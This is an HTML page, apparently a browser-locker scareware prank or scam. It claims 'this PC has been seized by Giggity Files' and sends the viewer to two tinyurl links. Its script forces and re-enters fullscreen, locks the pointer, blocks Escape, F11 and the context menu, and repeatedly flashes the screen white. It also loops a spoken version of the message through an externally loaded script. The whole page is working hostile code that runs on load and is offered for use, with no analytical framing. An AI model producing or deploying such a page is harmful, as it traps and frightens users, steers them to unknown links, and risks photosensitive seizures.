<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>System Notice</title>
<style>
  @keyframes pulse {
    0% { background-color: black; }
    50% { background-color: #2a0000; }
    100% { background-color: black; }
  }
  @keyframes flicker {
    0%,19%,21%,23%,25%,54%,56%,100% { opacity: 1; }
    20%,22%,24%,55% { opacity: 0.3; }
  }
  @keyframes shake {
    0% { transform: translate(0, 0); }
    25% { transform: translate(-5px, 5px); }
    50% { transform: translate(5px, -5px); }
    75% { transform: translate(-5px, -5px); }
    100% { transform: translate(5px, 5px); }
  }

  html, body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: monospace;
    user-select: none;
    cursor: none;
    animation: pulse 2s infinite;
    color: red;
    text-align: center;
    overflow: hidden;
  }

  h1 {
    font-size: 3em;
    margin: 0.5em 0;
    text-shadow: 0 0 20px red;
    animation: flicker 0.15s infinite, shake 0.1s infinite;
  }

  p {
    font-size: 1.5em;
    margin: 0.5em 0;
    animation: flicker 0.3s infinite;
  }

  .urls {
    font-family: monospace;
    font-size: 1.3em;
    color: yellow;
    user-select: text;
    animation: flicker 0.4s infinite;
  }

  /* Flash overlay */
  #flash {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background: white;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.05s ease;
    z-index: 9999;
  }
</style>
</head>
<body>
<div>
  <h1>THIS PC HAS BEEN SEIZED BY GIGGITY FILES</h1>
  <p>Visit the following addresses exactly as written:</p>
  <p class="urls">
    tinyurl.com/ggtfiles<br>
    tinyurl.com/quagfile
  </p>
</div>
<div id="flash"></div>

<!-- Include speak.js -->
<script src="https://cdn.jsdelivr.net/gh/mattytemple/speak-js/speakClient.js"></script>
<script>
(function() {
  const root = document.documentElement;
  const flash = document.getElementById('flash');

  function requestFS() {
    const req = root.requestFullscreen || root.webkitRequestFullscreen || root.msRequestFullscreen;
    if (req) req.call(root).catch(()=>{});
  }

  function keepFS() {
    if (!document.fullscreenElement &&
        !document.webkitFullscreenElement &&
        !document.msFullscreenElement) {
      requestFS();
    }
  }

  function lockPointer() {
    const lock = root.requestPointerLock || root.mozRequestPointerLock;
    if (lock) lock.call(root);
  }

  function speakMessage() {
    speak("This PC has been seized by Giggity Files. Visit tinyurl dot com slash G G T files or tinyurl dot com slash quagfile.", {
      pitch: 20,
      speed: 150,
      wordgap: 0,
      amplitude: 200
    });
  }

  function flashScreen() {
    flash.style.opacity = '1';
    setTimeout(() => flash.style.opacity = '0', 50);
  }

  // Run immediately
  requestFS();
  lockPointer();
  speakMessage();

  // Keep fullscreen, lock, and speaking
  setInterval(() => {
    keepFS();
    lockPointer();
    speakMessage();
    flashScreen();
  }, 4000);

  // Re-trigger on user input
  ["click","keydown","pointerdown","touchstart","mousemove"].forEach(evt => {
    window.addEventListener(evt, () => {
      requestFS();
      lockPointer();
      speakMessage();
      flashScreen();
    }, {passive:true});
  });

  // Instant re-entry on fullscreen exit
  ["fullscreenchange","webkitfullscreenchange","msfullscreenchange"].forEach(evt => {
    document.addEventListener(evt, () => {
      requestFS();
      lockPointer();
      speakMessage();
      flashScreen();
    }, {passive:true});
  });

  // Block ESC/F11
  window.addEventListener("keydown", e => {
    if (["Escape","F11"].includes(e.key)) {
      e.preventDefault();
      requestFS();
      lockPointer();
      speakMessage();
    }
  }, true);

  // Block context menu
  window.addEventListener("contextmenu", e => e.preventDefault());
})();
</script>
</body>
</html>
